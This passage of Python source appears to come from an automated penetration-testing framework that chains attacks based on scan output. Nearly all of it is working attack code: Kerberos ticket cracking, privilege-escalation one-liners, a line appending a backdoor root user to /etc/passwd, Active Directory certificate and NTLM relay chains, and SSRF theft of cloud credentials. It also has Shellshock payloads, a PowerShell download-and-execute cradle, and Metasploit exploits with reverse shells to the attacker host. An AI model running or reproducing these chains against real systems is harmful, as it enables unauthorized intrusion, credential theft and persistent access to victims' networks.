                ntlm_list = re.findall(r'[a-fA-F0-9]{32}:[a-fA-F0-9]{32}', output)
                all_ntlm = list({h.split(":")[1] for h in ntlm_list if ":" in h})
                if all_ntlm:
                    self._credential_reuse([], target, ntlm_hashes=all_ntlm)

        # Kerberoasting / ASREPRoasting tickets → auto-crack offline
        _krb_tgs   = re.findall(r'(\$krb5tgs\$[^\s]{30,})', output)
        _krb_asrep = re.findall(r'(\$krb5asrep\$[^\s]{30,})', output)
        for _tkt_list, _hmode, _lbl in [
            (_krb_tgs,   '13100', 'Kerberoast'),
            (_krb_asrep, '18200', 'ASREPRoast'),
        ]:
            if not _tkt_list:
                continue
            _tkt_file = f"/tmp/krb_{_lbl.lower()}_{target.replace('.','_')}.hash"
            _crack_f   = f"/tmp/krb_{_lbl.lower()}_{target.replace('.','_')}_cracked.txt"
            _tickets_joined = "\n".join(_tkt_list[:10])
            self._log(f"REACT [{target}] {len(_tkt_list)} tickets {_lbl} → auto-crack hashcat")
            self._enqueue(2, f"{_lbl}-Crack:{target}",
                f"printf '%s\\n' {repr(_tickets_joined)} > {_tkt_file} && "
                f"hashcat -m {_hmode} {_tkt_file} /usr/share/wordlists/rockyou.txt "
                f"--potfile-path {_crack_f} -q --force 2>/dev/null | grep -v '^$' | head -20 || "
                f"john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5{'tgs' if _lbl=='Kerberoast' else 'asrep'} "
                f"{_tkt_file} 2>/dev/null && john --show {_tkt_file} 2>/dev/null | head -10",
                target)

        # CVE auto-exploit: scan findings and react to any CVE with a known MSF module
        project = read_project(self.project_id)
        if project:
            for _f in project.get("findings", [])[-20:]:
                _cve = _f.get("cve", "")
                if _cve and _cve in self._CVE_MSF:
                    ports = {p for p, s, v in self._known_services.get(target, [])}
                    _port = 445 if 445 in ports else (80 if 80 in ports else 0)
                    self._msf_auto_exploit(_cve, target, _port)

        # LinPEAS — capabilities privesc auto-exploit
        if re.search(r'cap_setuid|cap_setgid', ol):
            _cap_bin = re.search(r'(/[/\w\-]+)\s*=.*cap_set(?:uid|gid)', output, re.I)
            _cred = self._admin_creds.get(target, {})
            _user = _cred.get("user", "")
            _pwd  = _cred.get("pwd", "")
            if _cap_bin and _user and _pwd:
                _ssh = (f"sshpass -p '{_pwd}' ssh -o StrictHostKeyChecking=no"
                        f" -o ConnectTimeout=8 {_user}@{target}")
                _bn = _cap_bin.group(1)
                _interp = "python3" if "python" in _bn else ("perl" if "perl" in _bn else "")
                if _interp:
                    self._enqueue(0, f"CapPrivEsc-{_interp}:{target}",
                        f"{_ssh} '{_bn} -c \"import ctypes;ctypes.CDLL(None).setuid(0);"
                        f"import os;os.execl(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104),chr(98)+chr(97)+chr(115)+chr(104))\"' 2>/dev/null"
                        if _interp == "python3" else
                        f"{_ssh} '{_bn} -e \"use POSIX qw(setuid); setuid(0); exec \\\"/bin/bash\\\"\"' 2>/dev/null", target)

        # /etc/passwd writable → add backdoor root user
        if re.search(r'PASSWD_WRITABLE_CONFIRMED|/etc/passwd.*writable', output, re.I):
            _cred = self._admin_creds.get(target, {})
            _user = _cred.get("user", "")
            _pwd  = _cred.get("pwd", "")
            if _user and _pwd:
                _ssh = (f"sshpass -p '{_pwd}' ssh -o StrictHostKeyChecking=no"
                        f" -o ConnectTimeout=8 {_user}@{target}")
                self._log(f"REACT [{target}] /etc/passwd escribible → inyectando usuario root")
                self._enqueue(0, f"PasswdBackdoor:{target}",
                    f"{_ssh} 'echo \"haxr::0:0::/root:/bin/bash\" >> /etc/passwd && su haxr -c \"id; cat /root/root.txt 2>/dev/null\"' 2>/dev/null", target)

        # Docker group → container escape to root
        if re.search(r'\(docker\)|docker\s+group', output, re.I):
            _cred = self._admin_creds.get(target, {})
            _user = _cred.get("user", "")
            _pwd  = _cred.get("pwd", "")
            if _user and _pwd:
                _ssh = (f"sshpass -p '{_pwd}' ssh -o StrictHostKeyChecking=no"
                        f" -o ConnectTimeout=8 {_user}@{target}")
                self._log(f"REACT [{target}] docker group → container escape")
                self._enqueue(0, f"DockerEscape:{target}",
                    f"{_ssh} 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh -c \"id; cat /root/root.txt 2>/dev/null\"' 2>/dev/null | head -5", target)

        # Fix existing GTFOBins sudo reaction — add SSH prefix from cred map
        if "PRIVESC_POSSIBLE_SUDO" in output and target not in getattr(self, '_gtfo_done', set()):
            getattr(self, '_gtfo_done', set()).add(target)
            _cred = self._admin_creds.get(target, {})
            _cred_user = _cred.get("user", "")
            _cred_pwd  = _cred.get("pwd", "")
            if not (_cred_user and _cred_pwd):
                for k, v in self._cred_map.items():
                    if k.startswith(target + ":"):
                        _cred_user = k.split(":")[1]
                        _cred_pwd = v
                        break
            if _cred_user and _cred_pwd:
                _ssh = (f"sshpass -p '{_cred_pwd}' ssh -o StrictHostKeyChecking=no"
                        f" -o ConnectTimeout=8 {_cred_user}@{target}")
                _sudo_bin_m = re.search(
                    r'NOPASSWD.*?/(bash|sh|python3?|perl|ruby|vim|find|nmap|awk|less|tar|curl|wget)',
                    output, re.I)
                _sbin = _sudo_bin_m.group(1) if _sudo_bin_m else "bash"
                _GTFO = {
                    "bash":    f"sudo bash -p -c 'id; cat /root/root.txt 2>/dev/null'",
                    "python":  f"sudo python -c 'import os; os.system(\"id; cat /root/root.txt 2>/dev/null\")'",
                    "python3": f"sudo python3 -c 'import os; os.system(\"id; cat /root/root.txt 2>/dev/null\")'",
                    "perl":    f"sudo perl -e 'system(\"id; cat /root/root.txt 2>/dev/null\")'",
                    "find":    f"sudo find / -name root.txt -exec cat {{}} \\; 2>/dev/null; sudo find /bin/bash -exec bash -p \\; 2>/dev/null | head -3",
                    "nmap":    f"TF=$(mktemp); echo 'os.execute(\"/bin/bash -p\")' > $TF; sudo nmap --script=$TF 2>/dev/null",
                    "vim":     f"sudo vim -c ':!/bin/bash -p' -c ':q!' /dev/null 2>/dev/null | head -3",
                    "tar":     f"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash 2>/dev/null | head -3",
                    "curl":    f"URL=$(curl -s ifconfig.me 2>/dev/null); sudo curl file:///root/root.txt 2>/dev/null",
                }
                _gtfo_cmd = _GTFO.get(_sbin.lower(), f"sudo {_sbin} -c 'id' 2>/dev/null")
                self._enqueue(0, f"GTFOBins-SSH:{target}:{_sbin}",
                    f"{_ssh} '{_gtfo_cmd}' 2>/dev/null", target)

        # ── ADCS (Certipy) — ESC1-8 detected → exploit chain ─────────────────
        if re.search(r'ESC[1-8]|[Vv]ulnerable [Tt]emplate|pkiobject|pKIEnrollmentService', output, re.I):
            _esc_types = re.findall(r'ESC[1-8]', output)
            _tmpl_m = re.search(r'Template Name\s*[:\|]\s*(\S+)', output)
            _ca_m   = re.search(r'CA Name\s*[:\|]\s*(.+?)(?:\n|$)', output)
            _tmpl = _tmpl_m.group(1) if _tmpl_m else None
            _ca   = _ca_m.group(1).strip() if _ca_m else None
            _cred = self._admin_creds.get(target, {})
            _u, _p = _cred.get("user", ""), _cred.get("pwd", "")
            _nt   = _cred.get("ntlm", "")
            self._log(f"REACT [{target}] ADCS {','.join(set(_esc_types)) or 'vulnerable'} → Certipy exploit chain")
            self._adcs_exploit(target, self._domain, _u, _p, _tmpl, _ca, _nt)

        # ── Certipy auth success → PTH with extracted NT hash ────────────────
        if re.search(r'[Gg]ot [Hh]ash|NT [Hh]ash.*[a-fA-F0-9]{32}|PKINIT.*[Ss]uccess|certipy.*[Aa]uth.*saved', output, re.I):
            _nt_m = re.search(r'(?:NT [Hh]ash|hash)[:\s]+([a-fA-F0-9]{32})', output)
            if _nt_m:
                _nt = _nt_m.group(1)
                _cred = self._admin_creds.get(target, {})
                self._admin_creds[target] = {**_cred, "ntlm": _nt, "user": "Administrator"}
                self._log(f"REACT [{target}] Certipy NT hash → PTH chain")
                self._impacket_chain(target, "Administrator", "", self._domain, _nt)

        # ── SMB signing disabled + domain → coerce relay attack ──────────────
        if re.search(r'[Ss]igning.*[Dd]isabled|[Ss]igning.*[Ff]alse|[Ss]igning.*[Nn]ot [Rr]equired', output, re.I):
            if self._domain:
                self._log(f"REACT [{target}] SMB signing OFF + domain '{self._domain}' → Coerce + Relay")
                self._coerce_relay_chain(target, self._domain)

        # ── Delegation found → delegation attacks ─────────────────────────────
        if re.search(r'[Uu]nconstrained|[Cc]onstrained.*[Dd]elegation|TrustedForDelegation', output, re.I):
            _cred = self._admin_creds.get(target, {})
            _u, _p, _nt = _cred.get("user",""), _cred.get("pwd",""), _cred.get("ntlm","")
            if _u:
                self._log(f"REACT [{target}] Delegación detectada → delegation attacks")
                self._delegation_attacks(target, self._domain, _u, _p, _nt)
                # If unconstrained delegation on non-DC → coerce DC to force TGT
                if re.search(r'[Uu]nconstrained', output, re.I) and self._domain:
                    self._log(f"REACT [{target}] Unconstrained delegation → coerce DC para capturar TGT")
                    self._coerce_relay_chain(target, self._domain)

        # ── GraphQL introspection enabled → mutation injection ────────────────
        if re.search(r'GRAPHQL_INTROSPECTION_ENABLED|GRAPHQL_ENDPOINT:', output, re.I):
            _ep_m = re.search(r'GRAPHQL_ENDPOINT:\s*(https?://\S+)', output)
            _ep = _ep_m.group(1) if _ep_m else f"http://{target}/graphql"
            self._log(f"REACT [{target}] GraphQL introspección → mutation/auth bypass testing")
            self._enqueue(3, f"GraphQL-Exploit:{target}",
                f"# GraphQL attack: mutation, auth bypass, IDOR\n"
                f"curl -s --max-time 10 -X POST '{_ep}' -H 'Content-Type: application/json' "
                f"-d '{{\"query\":\"mutation{{__typename}}\"}}' 2>/dev/null | head -5; "
                f"# IDOR: fetch user ID 1, 2, 3\n"
                f"for uid in 1 2 3 999; do "
                f"curl -s --max-time 5 -X POST '{_ep}' -H 'Content-Type: application/json' "
                f"-d '{{\"query\":\"{{user(id:$uid){{id email username password}}}}\"}}' 2>/dev/null | head -3; done; "
                f"graphw00f -t '{_ep}' 2>/dev/null | head -10 || clairvoyance '{_ep}' 2>/dev/null | head -20 || true",
                target)

        # ── JWT alg:none / weak secret → forge token ─────────────────────────
        if re.search(r'JWT_FOUND:|NONE_ALG_VULN|jwt.*cracked|jwt.*secret', output, re.I):
            _jwt_m = re.search(r'JWT_FOUND:\s*(eyJ[a-zA-Z0-9._-]+)', output)
            if _jwt_m:
                _jwt = _jwt_m.group(1)
                self._log(f"REACT [{target}] JWT vulnerable → forjando token admin")
                self._enqueue(3, f"JWT-Forge:{target}",
                    f"jwt_tool '{_jwt}' -X a 2>/dev/null | head -20; "
                    f"jwt_tool '{_jwt}' -X s 2>/dev/null | head -10; "
                    f"jwt_tool '{_jwt}' -C -d /usr/share/wordlists/rockyou.txt 2>/dev/null | "
                    f"grep -i 'crack\\|secret\\|found' | head -5; "
                    f"# Forge admin token (modify sub/role to admin)\n"
                    f"python3 -c \""
                    f"import base64,json; "
                    f"parts='{_jwt}'.split('.'); "
                    f"hdr=json.loads(base64.b64decode(parts[0]+'====')); "
                    f"pay=json.loads(base64.b64decode(parts[1]+'====')); "
                    f"print('Header:',hdr); print('Payload:',pay); "
                    f"pay.update({{\\\"role\\\":\\\"admin\\\",\\\"is_admin\\\":True,\\\"admin\\\":True}}); "
                    f"print('Modified payload:',pay)"
                    f"\" 2>/dev/null",
                    target)

        # ── ACL paths from BloodHound/bloodyAD → auto-exploit ────────────────
        for _ace_pat, _ace_type in [
            (r'GenericAll|has GenericAll', 'genericall'),
            (r'WriteDACL|has WriteDACL', 'writedacl'),
            (r'AddMember.*[Aa]dmin|WriteMembers.*[Aa]dmin', 'addmember'),
            (r'ForceChangePassword', 'forcechangepassword'),
        ]:
            if re.search(_ace_pat, output, re.I):
                _victim_m = re.search(r'(?:GenericAll|WriteDACL|AddMember|ForceChangePassword)\s+(?:on|over)?\s+([^\s,\n]+)', output, re.I)
                _victim = _victim_m.group(1).strip() if _victim_m else ""
                _cred = self._admin_creds.get(target, {})
                _u, _p = _cred.get("user",""), _cred.get("pwd","")
                if _u and _victim:
                    self._log(f"REACT [{target}] ACL {_ace_type} sobre {_victim} → abuso de ACL")
                    self._acl_abuse_chain(target, self._domain, _u, _p, _ace_type, _victim)
                break

        # Heartbleed → dump memory via MSF auxiliary
        if re.search(r'ssl-heartbleed|heartbleed', output, re.I) and re.search(r'VULNERABLE', output, re.I):
            self._log(f"REACT [{target}] Heartbleed → dumping memory")
            self._enqueue(1, f"Heartbleed-Dump:{target}",
                f"msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; "
                f"set RHOSTS {target}; set ACTION DUMP; set VERBOSE false; run; exit' 2>/dev/null | "
                f"grep -A5 'Heartbeat data\\|DUMP\\|memory' | head -30 || true", target)

        # Shellshock → direct curl RCE + MSF
        if re.search(r'http-shellshock|shellshock', output, re.I) and re.search(r'VULNERABLE', output, re.I):
            self._log(f"REACT [{target}] Shellshock → RCE via curl + MSF")
            _ports = {p for p, s, v in self._known_services.get(target, [])}
            _port = next(iter({80, 443, 8080} & _ports), 80)
            self._enqueue(1, f"Shellshock-RCE:{target}",
                f"curl -s --max-time 10 -A '() {{:;}}; echo; echo SHELLSHOCK_RCE; id' "
                f"http://{target}:{_port}/cgi-bin/admin.cgi 2>/dev/null; "
                f"curl -s --max-time 10 -A '() {{:;}}; echo; id' "
                f"http://{target}:{_port}/cgi-bin/status 2>/dev/null | head -5; "
                f"curl -s --max-time 10 -A '() {{:;}}; echo; id' "
                f"http://{target}:{_port}/cgi-bin/test-cgi 2>/dev/null | head -5 || true", target)

        # Double Pulsar (SMB backdoor) → direct exploit
        if re.search(r'double.pulsar|smb-double-pulsar|DOUBLEPULSAR', output, re.I):
            self._log(f"REACT [{target}] DoublePulsar → MSF")
            self._enqueue(0, f"DoublePulsar:{target}",
                f"msfconsole -q -x 'use exploit/windows/smb/smb_doublepulsar_rce; "
                f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; run; sleep 20; exit' 2>/dev/null", target)

        # ── SSRF cloud metadata detected → extract credentials ───────────────
        if re.search(r'SSRF_CLOUD_METADATA_CONFIRMED|"AccessKeyId"\s*:|iam.*security-credentials.*\w{16}|ami-id\ninstance-id', output, re.I):
            _param_m = re.search(r'SSRF_CANDIDATE:\s*param=(\S+)', output)
            _param = _param_m.group(1) if _param_m else "url"
            _ports_set = {p for p, s, v in self._known_services.get(target, [])}
            _port = next(iter({80, 443, 8080, 8000, 3000} & _ports_set), 80)
            _scheme = "https" if _port in (443, 8443) else "http"
            self._log(f"REACT [{target}] SSRF detectado ({_param}) → extrayendo metadata cloud")
            self._enqueue(2, f"SSRF-CloudMeta:{target}",
                f"BASE='{_scheme}://{target}:{_port}/?{_param}='; "
                f"curl -s --max-time 8 \"${{BASE}}http://169.254.169.254/latest/meta-data/\" 2>/dev/null | head -10; "
                f"curl -s --max-time 8 \"${{BASE}}http://169.254.169.254/latest/meta-data/iam/security-credentials/\" 2>/dev/null | head -5; "
                f"curl -s --max-time 8 \"${{BASE}}http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/\" "
                f"-H 'Metadata-Flavor: Google' 2>/dev/null | head -5; "
                f"curl -s --max-time 8 \"${{BASE}}http://169.254.169.254/metadata/instance?api-version=2021-01-01\" "
                f"-H 'Metadata: true' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20",
                target)

    # ── MSF auto-exploitation table ───────────────────────────────────────────
    _CVE_MSF = {
        'CVE-2017-0144':  ('exploit/windows/smb/ms17_010_eternalblue',   'windows/x64/meterpreter/reverse_tcp', 4444),
        'CVE-2008-4250':  ('exploit/windows/smb/ms08_067_netapi',         'windows/meterpreter/reverse_tcp',     4444),
        'CVE-2019-0708':  ('exploit/windows/rdp/cve_2019_0708_bluekeep',  'windows/x64/meterpreter/reverse_tcp', 4444),
        'CVE-2021-41773': ('exploit/multi/http/apache_normalize_path_rce','linux/x64/meterpreter/reverse_tcp',   4444),
        'CVE-2021-42013': ('exploit/multi/http/apache_normalize_path_rce','linux/x64/meterpreter/reverse_tcp',   4444),
        'CVE-2014-6271':  ('exploit/multi/http/apache_mod_cgi_bash_env',  'linux/x86/meterpreter/reverse_tcp',   4444),
        'CVE-2021-22204': ('exploit/multi/http/struts2_content_type_ognl','linux/x64/meterpreter/reverse_tcp',   4444),
        'CVE-2018-11776': ('exploit/multi/http/struts2_namespace_ognl',   'linux/x64/meterpreter/reverse_tcp',   4444),
        'CVE-2019-11580': ('exploit/multi/http/atlassian_crowd_pdkinstall','linux/x64/meterpreter/reverse_tcp',  4444),
        'CVE-2020-1472':  ('exploit/windows/dcerpc/cve_2020_1472_zerologon','',''),
        'CVE-2017-5638':  ('exploit/multi/http/struts2_content_type_ognl','linux/x64/meterpreter/reverse_tcp',   4444),
        'CVE-2019-6340':  ('exploit/unix/webapp/drupal_restws_unserialize','php/meterpreter/reverse_tcp',         4444),
        'CVE-2018-7600':  ('exploit/unix/webapp/drupal_drupalgeddon2',     'php/meterpreter/reverse_tcp',         4444),
        'CVE-2007-2447':  ('exploit/multi/samba/usermap_script',           'cmd/unix/reverse_netcat',             4444),
        'CVE-2004-2687':  ('exploit/unix/misc/distcc_exec',                'cmd/unix/reverse_bash',               4444),
        'CVE-2010-0738':  ('exploit/multi/http/jboss_invoke_deploy',       'java/meterpreter/reverse_tcp',        4444),
        'CVE-2012-0158':  ('exploit/windows/smb/ms12_020_maxchannelids',   'windows/meterpreter/reverse_tcp',     4444),
        'CVE-2015-1635':  ('exploit/windows/http/ms15_034_ulonglongadd',   '',''),
        'CVE-2021-3156':  ('exploit/linux/local/sudo_baron_samedit',        'linux/x64/meterpreter/reverse_tcp',  4444),
        'CVE-2022-26134': ('exploit/multi/http/atlassian_confluence_namespace_ognl','linux/x64/meterpreter/reverse_tcp',4444),
    }

    def _msf_auto_exploit(self, cve, target, port=None):
        """Look up CVE in the MSF table and queue an exploit job."""
        entry = self._CVE_MSF.get(cve)
        if not entry:
            return
        module, payload, lport = entry
        if not module:
            return
        rport = port or 445
        lhost = self.lhost
        lport_use = lport or self.lport
        if payload:
            msf_cmd = (f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {rport}; "
                       f"set LHOST {lhost}; set LPORT {lport_use}; set PAYLOAD {payload}; "
                       f"set ExitOnSession false; run -j; sleep 25; sessions -l; exit' 2>/dev/null")
        else:
            msf_cmd = (f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {rport}; "
                       f"run; sleep 20; exit' 2>/dev/null")
        self._log(f"MSF [{target}] Auto-exploit {cve} → {module}")
        self._enqueue(1, f"MSF-{cve}:{target}", msf_cmd, target)

    # ── BLOCK 3: Impacket + AD full attack chain ──────────────────────────────
    def _impacket_chain(self, target, user, pwd, domain="", ntlm_hash=""):
        dom = domain or self._domain
        dom_prefix = f"{dom}/" if dom else ""
        auth_flag = f"-hashes ':{ntlm_hash}'" if ntlm_hash else f"-p '{pwd}'"
        cme_hash = f"--hash '{ntlm_hash}'" if ntlm_hash else f"-p '{pwd}'"
        dom_user = f"{dom_prefix}{user}"

        self._log(f"IMPACKET [{target}] Cadena Impacket iniciada ({dom_user})")

        # secretsdump — dump all hashes/credentials
        self._enqueue(0, f"Secretsdump:{target}:{user}",
            f"impacket-secretsdump {auth_flag} '{dom_user}@{target}' 2>/dev/null | head -80", target)

        # psexec — SYSTEM shell
        self._enqueue(1, f"PSExec:{target}:{user}",
            f"echo 'whoami && hostname && ipconfig 2>/dev/null && type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt 2>nul' | "
            f"impacket-psexec {auth_flag} '{dom_user}@{target}' 2>/dev/null | head -25", target)

        # wmiexec — less noisy
        self._enqueue(1, f"WMIExec:{target}:{user}",
            f"impacket-wmiexec {auth_flag} '{dom_user}@{target}' 'whoami && systeminfo 2>/dev/null | findstr /B /C:\"OS\" /C:\"Domain\" 2>nul' 2>/dev/null | head -15", target)

        # smbexec fallback
        self._enqueue(2, f"SMBExec:{target}:{user}",
            f"impacket-smbexec {auth_flag} '{dom_user}@{target}' 2>/dev/null | head -10", target)

        # CrackMapExec for shares + SAM
        self._enqueue(1, f"CME-Admin:{target}:{user}",
            f"crackmapexec smb {target} -u '{user}' {cme_hash} --shares --sam 2>/dev/null | head -40", target)

        # WinPEAS — drop & run for full privesc enumeration (Windows)
        self._enqueue(3, f"WinPEAS:{target}:{user}",
            f"impacket-smbclient {auth_flag} '{dom_user}@{target}' -c "
            f"'use C$; cd \\Windows\\Temp; put /opt/winPEASx64.exe wp.exe 2>/dev/null' 2>/dev/null; "
            f"impacket-wmiexec {auth_flag} '{dom_user}@{target}' "
            f"'cmd /c C:\\Windows\\Temp\\wp.exe -notcolor 2>nul | findstr /i \"elevated vuln service unquoted alwaysinstall token group\"' "
            f"2>/dev/null | head -80 || "
            f"crackmapexec smb {target} -u '{user}' {cme_hash} -x "
            f"'powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe\\\")\"' "
            f"2>/dev/null | head -50", target)

        # WinRM if open
        ports_set = {p for p, s, v in self._known_services.get(target, [])}
        if 5985 in ports_set or 5986 in ports_set:
            self._enqueue(1, f"WinRM-Exec:{target}:{user}",
                f"crackmapexec winrm {target} -u '{user}' {cme_hash} -x 'whoami && type C:\\Users\\Administrator\\Desktop\\root.txt 2>nul' 2>/dev/null | head -15", target)

        # AD attacks if domain known
        if dom:
            dc_auth = f"--hashes ':{ntlm_hash}'" if ntlm_hash else f"-p '{pwd}'"
            self._enqueue(2, f"Kerberoasting:{target}:{user}",
                f"impacket-GetUserSPNs '{dom}/{user}' {dc_auth} -dc-ip {target} -request 2>/dev/null | head -40", target)
            self._enqueue(2, f"ASREPRoast:{target}",
                f"impacket-GetNPUsers '{dom}/' -dc-ip {target} -no-pass -request 2>/dev/null | head -30; "
                f"impacket-GetNPUsers '{dom}/{user}' {dc_auth} -dc-ip {target} -request 2>/dev/null | head -30", target)
            self._enqueue(3, f"DCSync:{target}:{user}",
                f"impacket-secretsdump {auth_flag} '{dom}/{user}@{target}' -just-dc 2>/dev/null | head -50", target)

            # BloodHound auto-collection when domain creds confirmed
            self._bloodhound_auto(target, user, pwd, dom, ntlm_hash)

            # ADCS — enumerate certificate templates (critical modern AD vector)
            _certipy_auth = f"-hashes ':{ntlm_hash}'" if ntlm_hash else f"-p '{pwd}'"
            self._enqueue(3, f"Certipy-Find:{target}:{user}",
                f"certipy find -u '{user}@{dom}' {_certipy_auth} -dc-ip {target} -vulnerable -stdout 2>/dev/null | head -80",
                target)

            # Delegation enumeration
            self._delegation_attacks(target, dom, user, pwd, ntlm_hash)

            # ZeroLogon check (CVE-2020-1472) — if no hash yet
            if not ntlm_hash:
                self._enqueue(4, f"ZeroLogon-Check:{target}",
                    f"zerologon_tester.py {dom.split('.')[0].upper()}$ {target} 2>/dev/null | head -10 "
                    f"|| python3 /opt/zerologon.py '{dom.split('.')[0].upper()}$' {target} 2>/dev/null | head -10 "
                    f"|| echo 'INFO: ZeroLogon (CVE-2020-1472) check: zerologon_tester.py DC$ {target}'",
                    target)

            # ACL/DACL enumeration with bloodyAD / dacledit
            self._enqueue(4, f"ACL-Enum:{target}:{user}",
                f"bloodyAD --host {target} -d '{dom}' -u '{user}' -p '{pwd}' get writable --otype ALL 2>/dev/null | head -30 "
                f"|| dacledit.py -action read -principal '{user}' -target '{dom}' "
                f"-d '{dom}' -u '{user}' -p '{pwd}' -dc-ip {target} 2>/dev/null | head -30 "
                f"|| python3 /opt/dacledit.py -action read -principal '{user}' "
                f"-d '{dom}' -u '{user}' -p '{pwd}' -dc-ip {target} 2>/dev/null | head -30",
                target)

            # Shadow credentials — try to add KeyCredential to our own account
            self._enqueue(5, f"ShadowCreds:{target}:{user}",
                f"certipy shadow auto -u '{user}@{dom}' -p '{pwd}' -dc-ip {target} "
                f"-account '{user}' 2>/dev/null | head -20 "
                f"|| pywhisker.py -d '{dom}' -u '{user}' -p '{pwd}' --target '{user}' "
                f"--action add --dc-ip {target} 2>/dev/null | head -15",
                target)

    # ── BloodHound auto-collection + path analysis ────────────────────────────
    def _bloodhound_auto(self, dc_ip, user, pwd, domain, ntlm_hash=""):
        """Run bloodhound-python to collect AD data and create findings from attack paths."""
        if not domain:
            return
        safe_dom = domain.replace(".", "_")
        out_dir = f"/tmp/bh_{safe_dom}_{dc_ip.replace('.','_')}"
        auth = f"--hashes ':{ntlm_hash}'" if ntlm_hash else f"-p '{pwd}'"

        self._log(f"BLOODHOUND [{dc_ip}] Iniciando recolección AD ({domain})")
        self._enqueue(2, f"BloodHound-Collect:{dc_ip}",
            f"mkdir -p {out_dir} && "
            f"bloodhound-python -u '{user}' {auth} -d '{domain}' -dc '{dc_ip}' "
            f"-c All --zip -o {out_dir} 2>/dev/null && "
            f"echo 'BH_COLLECTION_DONE' && "
            f"ls {out_dir}/ 2>/dev/null", dc_ip)

        # Parse any existing BH JSON files for quick wins
        self._enqueue(3, f"BloodHound-Parse:{dc_ip}",
            f"find {out_dir} -name '*.json' 2>/dev/null | while read f; do "
            f"python3 -c \""
            f"import json,sys; d=json.load(open(sys.argv[1])); "
            f"data=d.get('data',d.get('nodes',[])); "
            f"print('BH_USERS:', sum(1 for x in data if x.get('Properties',{{}}).get('enabled'))); "
            f"das=[x['Properties'].get('samaccountname','?') for x in data "
            f"  if 'admin' in str(x.get('Properties',{{}})).lower() "
            f"  or 'Domain Admins' in str(x.get('MemberOf',[])) ]; "
            f"print('BH_DA:', das[:5]) "
            f"\" \\\"\\$f\\\" 2>/dev/null; done", dc_ip)

    # ── BLOCK 5: ADCS (Certipy) exploitation chain ───────────────────────────
    def _adcs_exploit(self, target, domain, user, pwd, template=None, ca=None, ntlm_hash=""):
        """Certipy ESC1 full chain: find → req cert with admin SAN → auth → extract NT hash"""
        dom = domain or self._domain
        if not dom or not user:
            return
        auth_flag = f"-hashes ':{ntlm_hash}'" if ntlm_hash else f"-p '{pwd}'"

        # Step 1: Find vulnerable templates (authenticated)
        self._enqueue(1, f"Certipy-Find-Auth:{target}",
            f"certipy find -u '{user}@{dom}' {auth_flag} -dc-ip {target} -vulnerable -stdout 2>/dev/null | head -80 "
            f"|| certipy find -u '{user}@{dom}' -p '{pwd}' -dc-ip {target} -vulnerable -stdout 2>/dev/null | head -80",
            target)

        if template:
            _ca = ca or "CA"
            # Step 2: ESC1 — request cert with administrator SAN
            self._enqueue(2, f"Certipy-ESC1-Req:{target}",
                f"certipy req -u '{user}@{dom}' -p '{pwd}' -dc-ip {target} "
                f"-target {target} -template '{template}' -upn 'administrator@{dom}' "
                f"-ca '{_ca}' -out /tmp/certipy_admin_{target.replace('.','_')} 2>/dev/null | head -20",
                target)
            # Step 3: Authenticate with cert → extract NT hash + TGT
            self._enqueue(3, f"Certipy-Auth:{target}",
                f"certipy auth -pfx /tmp/certipy_admin_{target.replace('.','_')}.pfx "
                f"-dc-ip {target} -domain {dom} 2>/dev/null | head -15",
                target)

        # ESC8 — NTLM relay to AD CS HTTP enrollment endpoint
        self._enqueue(3, f"Certipy-ESC8-Relay:{target}",
            f"# ESC8: relay NTLM to CA HTTP enrollment. Run ntlmrelayx + certipy relay in bg\n"
            f"certipy relay -ca {target} -template DomainController 2>/dev/null | head -10 || "
            f"echo 'INFO: ESC8 requires: ntlmrelayx --adcs --template DomainController + coerce DC auth'",
            target)

        # Shadow Credentials (msDS-KeyCredentialLink abuse) via certipy
        self._enqueue(4, f"Certipy-Shadow:{target}:{user}",
            f"certipy shadow auto -u '{user}@{dom}' -p '{pwd}' -dc-ip {target} -account '{user}' 2>/dev/null | head -20 "
            f"|| pywhisker.py -d '{dom}' -u '{user}' -p '{pwd}' --target '{user}' --action add --dc-ip {target} 2>/dev/null | head -15",
            target)

    # ── BLOCK 6: Coercion + NTLM Relay chain ─────────────────────────────────
    def _coerce_relay_chain(self, dc_ip, domain):
        """Set up ntlmrelayx + coerce DC authentication → RBCD / delegate + DCSync"""
        lhost_cmd = "$(hostname -I | awk '{print $1}')"
        dom = domain or self._domain
        self._log(f"COERCE [{dc_ip}] Configurando coerción + relay NTLM (LHOST={lhost_cmd})")

        # ntlmrelayx targets: relay to LDAP(S) of DC → add computer account for RBCD
        self._enqueue(0, f"NTLMRelayx-Setup:{dc_ip}",
            f"LHOST={lhost_cmd}; "
            f"echo '=== ntlmrelayx: relay NTLM → LDAPS DC (crear cuenta máquina para RBCD) ==='; "
            f"# Run in background: impacket-ntlmrelayx -t ldaps://{dc_ip} --add-computer PentestRelay$ --no-wcf-server -smb2support &\n"
            f"# Then trigger coercion below:\n"
            f"impacket-ntlmrelayx -t ldaps://{dc_ip} --add-computer PentestRelay --no-wcf-server -smb2support 2>/dev/null &"
            f"sleep 3; "
            f"petitpotam.py -d '{dom}' $LHOST {dc_ip} 2>/dev/null | head -10 "
            f"|| python3 /opt/PetitPotam/PetitPotam.py -d '{dom}' $LHOST {dc_ip} 2>/dev/null | head -10 "
            f"|| python3 /opt/PetitPotam.py $LHOST {dc_ip} 2>/dev/null | head -10",
            dc_ip)

        # DFSCoerce fallback
        self._enqueue(1, f"DFSCoerce:{dc_ip}",
            f"LHOST={lhost_cmd}; "
            f"python3 /opt/DFSCoerce/dfscoerce.py -d '{dom}' $LHOST {dc_ip} 2>/dev/null | head -10 "
            f"|| python3 /opt/dfscoerce.py $LHOST {dc_ip} 2>/dev/null | head -10 "
            f"|| echo 'INFO: DFSCoerce not found at /opt/. Install: git clone https://github.com/ly4k/DFSCoerce'",
            dc_ip)

        # PrinterBug (SpoolSample) — alternate coercion
